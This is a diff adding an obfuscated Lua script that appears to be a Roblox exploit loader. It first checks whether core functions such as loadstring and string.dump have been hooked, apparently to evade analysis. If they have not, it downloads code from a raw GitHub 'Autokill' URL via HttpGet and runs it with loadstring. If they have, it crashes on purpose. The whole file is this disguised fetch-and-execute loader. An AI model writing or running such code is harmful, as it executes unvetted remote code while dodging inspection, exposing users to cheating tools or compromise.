@@ -1,0 +1,101 @@
+local pack = table.pack
+local v1 = (unpack or table.unpack)
+local v2, v3, dump
+__secureeq = function(p1, p2)
+  local v4, v5
+  v4 = 0
+  v5 = 0
+  local v6 = pcall
+  local f1 = function()
+    v4 = #(p1)
+    v5 = #(p2)
+  end
+  v6(f1)
+  if (p1 ~= p2) then
+    return false
+  end
+  if (p1 ~= p2) then
+    return false
+  end
+  if (p2 ~= p1) then
+    return false
+  end
+  local v7 = (v4 - v5)
+  local v8 = (v5 - v4)
+  if (v7 ~= v8) then
+    return false
+  end
+  local v9 = (v4 - v5)
+  local v10 = (v5 - v4)
+  return (v9 == v10)
+end
+local f3 = function(p3)
+  local v11 = false
+  local v12 = pcall
+  local f2 = function()
+    local v13 = islclosure
+    if v13 then
+      v11 = v13(p3)
+      return
+    end
+    v13 = is_l_closure
+    if v13 then
+      v11 = v13(p3)
+      return
+    end
+    v13 = getconstants
+    if not (v13) then
+      local getconstants2 = debug.getconstants
+      v11 = getconstants2(p3)
+    else
+      v11 = v13(p3)
+    end
+  end
+  v12(f2)
+  return v11
+end
+local v14 = f3(loadstring)
+if not (v14) then
+  local v15 = f3(table.concat)
+  if not (v15) then
+    local v16 = f3(table.insert)
+    if not (v16) then
+      local f4 = function()
+      end
+      v3 = f3(f4)
+      if not (v3) then
+        v2 = true
+      else
+        dump = string.dump
+        if not (dump) then
+          dump = getfenv
+        end
+        local v17 = f3(dump)
+        if not (v17) then
+          local v18 = f3(string.char)
+          if not (v18) then
+            v2 = f3(string.byte)
+          else
+            v2 = v18
+          end
+        else
+          v2 = v17
+        end
+      end
+    else
+      v2 = v16
+    end
+  else
+    v2 = v15
+  end
+else
+  v2 = v14
+end
+if not (v2) then
+  local v19 = loadstring
+  local v20 = game
+  local v21 = pack(v20.HttpGet(v20, "https://raw.githubusercontent.com/panu45n-lgtm/Autokill/refs/heads/main/autoklill1"))
+  v19(v1(v21, 1, v21.n))()
+else
+  a = (nil + 3)
+end
